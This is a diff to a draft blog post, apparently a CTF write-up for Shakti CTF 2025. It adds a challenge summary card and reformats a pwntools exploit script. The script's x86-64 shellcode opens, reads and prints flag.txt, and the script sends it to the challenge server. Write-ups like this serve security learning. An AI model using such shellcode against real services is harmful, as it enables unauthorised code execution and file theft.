@@ -9,6 +9,21 @@ category: "CTF Writeup"
 draft: true
 ---
 
+import ChallengeCard from "../../components/misc/ChallengeCard.astro";
+
+<ChallengeCard
+	event="Shakti CTF 2025"
+	rank={131}
+	total={554}
+	challenges={[
+		{ name: "Hooman", category: "Web" },
+		{ name: "Binary Reflection", category: "Forensics" },
+		{ name: "Glitch In Frame", category: "Forensics" },
+		{ name: "Secret Mission", category: "Pwn" },
+		{ name: "Seashells", category: "Pwn" },
+	]}
+/>
+
 跟 eating 一起打，這次計分沒有分開計
 
 131 / 554
@@ -138,49 +153,49 @@ context.arch = 'amd64'
 context.log_level = 'info'
 
 shellcode = asm('''
-    xor rax, rax
-    lea rdi, [rip + filename]
-    xor rsi, rsi
-    mov rax, 2          /* sys_open */
-    syscall
+    xor rax, rax
+    lea rdi, [rip + filename]
+    xor rsi, rsi
+    mov rax, 2          /* sys_open */
+    syscall
 
-    mov rdi, rax        /* fd */
-    lea rsi, [rip + buf]
-    mov rdx, 100
-    mov rax, 0          /* sys_read */
-    syscall
+    mov rdi, rax        /* fd */
+    lea rsi, [rip + buf]
+    mov rdx, 100
+    mov rax, 0          /* sys_read */
+    syscall
 
-    mov rdi, 1          /* stdout */
-    lea rsi, [rip + buf]
-    mov rdx, 100
-    mov rax, 1          /* sys_write */
-    syscall
+    mov rdi, 1          /* stdout */
+    lea rsi, [rip + buf]
+    mov rdx, 100
+    mov rax, 1          /* sys_write */
+    syscall
 
-    mov rax, 60         /* sys_exit */
-    xor rdi, rdi
-    syscall
+    mov rax, 60         /* sys_exit */
+    xor rdi, rdi
+    syscall
 
 filename:
-    .asciz "flag.txt"
+    .asciz "flag.txt"
 buf:
-    .space 100
+    .space 100
 ''')
 
 def main():
-    p = remote("43.205.113.100", 8855)
+    p = remote("43.205.113.100", 8855)
 
-    prompt = p.recvuntil(b'>>')
-    print(prompt.decode())
+    prompt = p.recvuntil(b'>>')
+    print(prompt.decode())
 
-    p.send(shellcode.ljust(0x500, b'\x00'))
+    p.send(shellcode.ljust(0x500, b'\x00'))
 
-    flag = p.recvrepeat(timeout=3)
-    print("[*] Flag output:\n", flag.decode())
+    flag = p.recvrepeat(timeout=3)
+    print("[*] Flag output:\n", flag.decode())
 
-    p.close()
+    p.close()
 
 if __name__ == "__main__":
-    main()
+    main()
 ```
 
 成功拿到 flag
